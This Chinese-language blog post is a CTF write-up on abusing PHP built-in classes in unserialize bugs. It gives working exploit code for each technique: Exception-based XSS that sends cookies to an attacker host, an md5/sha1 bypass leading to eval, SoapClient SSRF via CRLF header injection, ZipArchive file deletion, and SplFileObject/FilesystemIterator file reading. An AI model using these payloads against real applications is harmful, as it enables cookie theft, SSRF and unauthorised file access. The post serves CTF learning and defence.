---
title: PHP原生类的利用总结
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-03-29 23:02:46
authorLink:
tags: PHP
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg
---
如题。

## 使用 Error/Exception 内置类进行 XSS
出处：[BJDCTF 2nd]xss之光
源码：

    <?php
    $a = $_GET['yds_is_so_beautiful'];
    echo unserialize($a);
    ?>
Exception payload(适用于php5和php7):

    <?php
    $a = serialize(new Exception("<script>window.location.href='IP'+document.cookie</script>"));
    echo urlencode($a);
    ?>

Error payload(适用于php7)：

    <?php
    $a = new Error("<script>alert(1)</script>");
    $b = serialize($a);
    echo urlencode($b);
    ?>
ps：如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性，即便是这样，也不要将重要信息存入cookie。

## 使用 Error/Exception 内置类绕过哈希比较
出处：[极客大挑战 2020]Greatphp
源码：

    class SYCLOVER {
        public $syc;
        public $lover;
    
        public function __wakeup(){
            if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
               if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
                   eval($this->syc);
               } else {
                   die("Try Hard !!");
               }
               
            }
        }
    }
既要绕过md5又要命令执行正常是很难实现的。
md5/sha1对一个类进行hash的时候会触发那个类的toString，这里由于没有可以利用的类，所以需要寻找原生类，比如Error,Exception等，然后由于Error的toString是无法完全控制的，会有其他输出，所以使用?><?=的方式结束php从而完整控制整块代码，(这里有个坑就是Error必须不等，但toString生成的结果必须相等，由于toString生成的结果包含当前代码所在的行，所以新生成的2个实例必须在同一行)，因为禁用了小括号无法调用函数，尝试直接include "/flag"即可。

exp：

    <?php
    class SYCLOVER
    {
        public $syc;
        public $lover;
    
        public function __wakeup()
        {
            if (($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc) === sha1($this->lover))) {
               if (!preg_match("/\<\?php|\(|\)|\"|\'/", $this->var1, $match)) {
                eval($this->syc);
                } else {
                    die("Try Hard !!");
                }
        
            }
        }
    }
    
    $str = "?>"."<?=include~".urldecode("%D0%99%93%9E%98")."?>";
    $a = new Exception($str, 1);$b = new Exception($str, 2);
    $c = new SYCLOVER();
    $c->syc = $a;
    $c->lover = $b;
    echo(urlencode(serialize($c)));
    ?>

## 使用SoapClient类进行 SSRF
这个就很常见了。
大概都是这样的：需要admin 127.0.0.1登录 然后又是remoteaddr无法直接伪造，所以找到能实例化任意类的地方用 SoapClient 类进行 SSRF。

exp：

    <?php
    $target = 'http://123.206.216.198/bbb.php';
    $post_string = 'a=b&flag=aaa';
    $headers = array(
        'X-Forwarded-For: 127.0.0.1',
        'Cookie: xxxx=1234'
        );
    $b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));
    
    $aaa = serialize($b);
    $aaa = str_replace('^^','%0d%0a',$aaa);
    $aaa = str_replace('&','%26',$aaa);
    echo $aaa;
    ?>

## 使用ZipArchive类删除文件
出处：NepCTF 2021 梦里花开牡丹亭
pop链很简单，考点就是利用ZipArchive类的open方法去删除waf.txt文件

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210330124316.png)

原理如上。

## 利用SLP类中的类读文件
出处：MAR DASCTF2021-ez_serialize
也是一个思路很简单的反序列化，就是考原生类的利用。
官方文档：https://www.php.net/manual/zh/book.spl.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210330125633.png)

源码：

    <?php
    error_reporting(0);
    highlight_file(__FILE__);
    
    class A{
        public $class;
        public $para;
        public $check;
        public function __construct()
        {
            $this->class = "B";
            $this->para = "ctfer";
            echo new  $this->class ($this->para);
        }
        public function __wakeup()
        {
            $this->check = new C;
            if($this->check->vaild($this->para) && $this->check->vaild($this->class)) {
                echo new  $this->class ($this->para);
            }    
            else
                die('bad hacker~');
        }

    }
    class B{
        var $a;
        public function __construct($a)
        {
            $this->a = $a;
            echo ("hello ".$this->a);
        }
    }
    class C{
    
        function vaild($code){
            $pattern = '/[!|@|#|$|%|^|&|*|=|\'|"|:|;|?]/i';
            if (preg_match($pattern, $code)){
                return false;
            }
            else
                return true;
        }
    }


    if(isset($_GET['pop'])){
        unserialize($_GET['pop']);
    }
    else{
        $a=new A;
    
    }  hello ctfer

exp1(查看目录):

    <?php
    class A{
        public $class='FilesystemIterator';
        public $para="/var/www/html";
        public $check;
        }
    $o  = new A();
    echo serialize($o);

exp2(读flag):

    <?php
    class A{
        public $class='SplFileObject';
        public $para="/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php";
        public $check;
        }

    $o  = new A();
    echo serialize($o);

## 未完待续
